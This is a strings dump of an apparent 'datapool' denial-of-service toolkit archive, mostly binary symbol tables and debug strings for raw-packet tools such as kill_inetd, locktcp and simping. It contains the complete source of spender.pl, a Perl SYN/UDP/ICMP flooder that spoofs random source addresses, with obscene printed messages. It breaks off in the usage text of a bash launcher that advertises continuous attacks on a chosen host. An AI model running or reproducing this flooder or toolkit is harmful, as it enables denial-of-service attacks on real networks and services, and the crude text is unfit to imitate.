            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "kill_inetd.c",
            "send_tcp_segment",
            "ip_sum",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "sock",
            "htonl@@GLIBC_2.0",
            "getaddr",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "ssock",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "probe_seq",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/locktcp",
            "0100755",
            "0000000",
            "0000000",
            "00000032317",
            "07100656631",
            "013527",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "connect",
            "strerror",
            "atol",
            "socket",
            "select",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "read",
            "stderr",
            "htons",
            "__errno_location",
            "_IO_stdin_used",
            "__libc_start_main",
            "fcntl",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh$",
            "X1fXPy",
            "fE\\P1",
            "1fEP`",
            "UPEP",
            "PXP\\Ph",
            "P EP",
            "`\u0209TP\t&",
            "E@P/ E}",
            "~ZEPj",
            "`PEPw",
            "PXP\\Ph",
            "PJ EP+",
            "8[_]",
            "\u0403;u[]",
            "Usage: %s ip-addr port",
            "Unable to create TCP socket: %s",
            "Can't connect to %.80s,%d: %s",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "locktcp.c",
            "atol@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "select@@GLIBC_2.0",
            "strerror@@GLIBC_2.0",
            "__errno_location@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "fcntl@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "read@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/simping",
            "0100755",
            "0000000",
            "0000000",
            "00000032454",
            "07100656673",
            "013546",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "inet_ntoa",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "EP }",
            " PEPs }-",
            "\u0403;u[]",
            "socket",
            "IP_HDRINCL",
            "usage: %s hostname",
            "%s: unknown host",
            "Sending to %s",
            "offset %d: ",
            "sendto",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "simping.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/spender.pl",
            "0100755",
            "0000000",
            "0000000",
            "00000004452",
            "07101430250",
            "014125",
            "ustar  ",
            "root",
            "root",
            "#!/usr/bin/perl",
            "#oOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOo",
            "#O spender's lame icmp/udp/syn flooder=\\ O",
            "#oOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOo",
            "use Net::RawIP;",
            "$ARGC=@ARGV;",
            "if ($ARGC !=3) {",
            "\tprint \"dis app is tighter than yer little sister's twat\\n\";",
            "\tprint \"\\nUsage: perl spender.pl <dst ip> <port> <num>\\n\";",
            "\texit;",
            "print \"\\ndoin yer mom doggie style...\\n\";",
            "$ip1       = int rand(255);",
            "$ip2       = int rand(255);",
            "$ip3       = int rand(255);",
            "$ip4       = int rand(255);",
            "$srcip     = \"$ip1.$ip2.$ip3.$ip4\";",
            "$dstip     = $ARGV[0];    ",
            "$dstprt    = $ARGV[1];    ",
            "$num       = $ARGV[2];",
            "$x = new Net::RawIP;",
            "$y = new Net::RawIP({",
            "    ip => {ihl => 5,tot_len => 1024,id => 1,ttl => 128,frag_off => 8,daddr => $dstip},",
            "    icmp => {id => 2650}",
            "\t\t    });",
            "$v = new Net::RawIP({",
            "    ip => {ihl => 5,tot_len => 1024,id => 1,ttl => 128,frag_off => 8,daddr => $dstip},",
            "    icmp => {id => 2650}",
            "\t           });",
            "$u = new Net::RawIP({",
            "    ip => {ihl => 5,tot_len => 1024,id => 1,ttl => 128,frag_off => 8,daddr => $dstip},",
            "    icmp => {id => 2650}",
            "\t           });",
            "$z = new Net::RawIP({",
            "    ip => {ihl => 5,tot_len => 1024,id => 1,ttl => 128,frag_off => 8,daddr => $dstip},",
            "    udp => {check => 0}",
            "\t\t    });",
            "$x->set({ ip => {saddr => $srcip,daddr => $dstip,frag_off => 8},",
            "\t tcp => {dest => $dstprt,source => $dstprt,psh => 0,fin => 0, ack => 0,rst => 0,res1 => 0, res2 => 0,urg => 0, syn => 1}",
            "\t});",
            "$y->set({",
            "        ip => {saddr => $srcip,daddr => $dstip,frag_off => 8},",
            "        icmp => {type => int rand(14),code => int rand(10)}                                           ",
            "      });",
            "$v->set({",
            "        ip => {saddr => $srcip,daddr => $dstip,frag_off => 8},",
            "        icmp => {type => int rand(14),code => int rand(10)}                                           ",
            "      });",
            "$u->set({",
            "        ip => {saddr => $srcip,daddr => $dstip,frag_off => 8},",
            "        icmp => {type => int rand(14),code => int rand(10)}                                           ",
            "      });",
            "$z->set({",
            "        ip =>  {saddr => $srcip,daddr => $dstip,frag_off => 8},",
            "        udp => {dest => $dstprt,source => $dstprt}",
            "        });",
            "for($i=0;$i<=$num;$i++) {",
            "$x->send;",
            "print \"uNF uNF uNF uNF...\\n\";",
            "for($i=0;$i<=$num;$i++) {",
            "$z->send;",
            "print \"mmm...skull fucking...\\n\";",
            "for($i=0;$i<=$num;$i++) {",
            "$v->send;",
            "$y->send;",
            "$u->send;",
            "print \"dammit i can't cum from this stupid wh0re=\\\\\\n\";",
            "datapool/datapool.fc",
            "0100755",
            "0000000",
            "0000000",
            "00000102632",
            "07101435724",
            "013507",
            "ustar  ",
            "root",
            "root",
            "#!/bin/bash",
            "usage () {",
            "echo \"Usage: $0 [-p] [portlow-porthigh] [-x] [-v] [logfile] [-k]\"",
            "echo \" [-d] [destination ip] [-s] [-l] [T1|T3|OC3|Modem|Slowass] \"",
            "echo \" [-i] [source ip] [-c] [-t] [#of attacks] [-r] [attackname]\"",
            "echo \"Options:\"",
            "echo \"[-d]: Specifies destination IP or hostname: REQUIRED\"",
            "echo \"[-p]: Specifies port range to scan.  ex: -p 1-1024\"",
            "echo \"[-x]: \\\"Don't stop till they drop\\\"\"",
            "echo \"[-v]: Logs results of scan to file.  ex: -v logfile.log\"",
            "echo \"[-s]: Scan ports only.\"",
            "echo \"[-l]: Specifies line speed. Choose from T1,T3,OC3,Modem, and Slowass.\"",
            "echo \"[-i]: Specifies source IP.  ex: -i 127.0.0.1\"",
            "echo \"[-k]: Wait till host is online, then attack.\"",
            "echo \"[-c]: Never stop attacking.\"",
            "echo \"[-t]: Number of simultaneous attacks to launch. ex: -t 4\"",
            "echo \"[-r]: Run this attack only.  ex: -r onetwothreefour\"",
            "echo \"      Note: attacknames can be found in datapool.fc\"",
            "exit 1",
            "nfo () {",
            "echo \"\"",
            "echo \"\"",
            "echo \"\"",
            "echo \"\"",
            "echo \"\"",
            "echo \"\"",
            "echo \"             d8b           d8b                                       d8b\"",
            "echo \"             888         \\\"88888\\\"                                     888\"",
            "echo \"        e88~-888  e88~-888 888  e88~-888 d88-~88e   e88~-e   e88~-e  888\"",
            "echo \"       d88D  888 d888  888 888 d888  888 888  P88b d888  8b d888  8b 888\"",
            "echo \"       888A  888 8888  888 888 8888  888 888  O888 8888  88 8888  88 888\" ",
            "echo \"       888T  888 Y888  888 888 Y888  888 888  O88P Y888  8P Y888  8P 888\"",
